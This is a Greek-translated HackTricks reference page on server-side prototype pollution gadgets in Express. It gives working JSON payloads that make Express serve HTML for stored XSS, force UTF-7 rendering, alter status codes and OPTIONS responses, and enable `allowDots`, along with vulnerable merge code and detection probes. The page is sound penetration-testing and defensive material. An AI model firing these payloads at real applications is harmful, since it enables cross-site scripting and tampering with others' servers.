# Express Prototype Pollution Gadgets

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Serve XSS responses

**Για περισσότερες λεπτομέρειες** [**ρίξτε μια ματιά στην αρχική έρευνα**](https://portswigger.net/research/server-side-prototype-pollution)

### Change JSON content-type to HTML

Σε μια εφαρμογή Express που χρησιμοποιεί **JSON content type response** και ανακλά ένα JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Σε αυτές τις περιπτώσεις, το XSS δεν είναι συνήθως δυνατό με τύπο περιεχομένου JSON. Ωστόσο, με την μόλυνση πρωτοτύπου μπορούμε να **μπερδέψουμε το Express ώστε να εξυπηρετήσει μια HTML απάντηση.** Αυτή η ευπάθεια βασίζεται στη χρήση του **`res.send(obj)`** από την εφαρμογή και στη χρήση του body parser με τον τύπο περιεχομένου application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Με την **ρύπανση** των ιδιοτήτων **`body`** και **`_body`**, είναι δυνατόν να προκαλέσετε **την Express να σερβίρει τον τύπο περιεχομένου HTML** και να ανακλά την ιδιότητα `_body`, με αποτέλεσμα αποθηκευμένο XSS.

### Απόδοση UTF7

Είναι δυνατόν να κάνετε την express **να αποδώσει περιεχόμενο UTF-7 με**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Safe Scanning Techinques

### JSON spaces

Η παρακάτω PP θα προσθέσει ένα επιπλέον διάστημα στα χαρακτηριστικά μέσα σε ένα JSON που δεν θα σπάσει τη λειτουργικότητα:
```json
{"__proto__":{"json spaces": " "}}
```
Τότε ένα αντανάκλαση JSON θα φαίνεται έτσι:
```json
{"foo":  "bar"} -- Note the extra space
```
### Exposed Headers

Ο παρακάτω PP gadget θα κάνει τον διακομιστή να στείλει πίσω την HTTP κεφαλίδα: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Απαιτείται η **εγκατάσταση του CORS module**

### **Μέθοδος OPTIONS**

Με το παρακάτω payload, είναι δυνατόν να **κρυφτεί μια μέθοδος από μια απάντηση OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Κατάσταση**

Είναι δυνατόν να αλλάξετε τον **κωδικό κατάστασης που επιστρέφεται** χρησιμοποιώντας το παρακάτω PP payload:
```json
{"__proto__":{"status":510}}
```
### Σφάλμα

Όταν αναθέτετε σε ένα πρωτότυπο με μια πρωτογενή τιμή όπως μια συμβολοσειρά, παράγει μια **λειτουργία no-op καθώς το πρωτότυπο πρέπει να είναι ένα αντικείμενο**. Εάν προσπαθήσετε να αναθέσετε ένα αντικείμενο πρωτοτύπου στο `Object.prototype` αυτό θα **ρίξει μια εξαίρεση**. Μπορούμε να χρησιμοποιήσουμε αυτές τις δύο συμπεριφορές για να **ανιχνεύσουμε αν η ρύπανση του πρωτοτύπου ήταν επιτυχής**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Reflected Value

Όταν μια εφαρμογή περιλαμβάνει ένα αντικείμενο στην απάντησή της, η δημιουργία ενός χαρακτηριστικού με **ασυνήθιστο όνομα μαζί με το `__proto__`** μπορεί να είναι διαφωτιστική. Συγκεκριμένα, αν **μόνο το ασυνήθιστο χαρακτηριστικό επιστρέφεται** στην απάντηση, αυτό θα μπορούσε να υποδηλώνει την ευπάθεια της εφαρμογής:
```json
{"unusualName":"value","__proto__":"test"}
```
Επιπλέον, σε σενάρια όπου χρησιμοποιείται μια βιβλιοθήκη όπως το Lodash, η ρύθμιση μιας ιδιότητας τόσο μέσω της ρύθμισης πρωτοτύπου (PP) όσο και άμεσα μέσα στο αντικείμενο προσφέρει μια άλλη διαγνωστική προσέγγιση. Εάν μια τέτοια ιδιότητα παραληφθεί από την απόκριση, υποδηλώνει ότι το Lodash επαληθεύει την ύπαρξη της ιδιότητας στο στοχευόμενο αντικείμενο πριν από τη συγχώνευση:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Misc

### Allow Dots

Υπάρχει μια επιλογή στο Express που σας επιτρέπει να **δημιουργείτε αντικείμενα από παραμέτρους συμβολοσειράς ερωτήματος**.\
Μπορείτε σίγουρα να το χρησιμοποιήσετε σε μια **αλυσίδα** σφαλμάτων για να εκμεταλλευτείτε μια **ευπάθεια μόλυνσης πρωτοτύπου**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` δημιουργεί ένα αντικείμενο στο Node.**

## Αναφορές

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)


{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
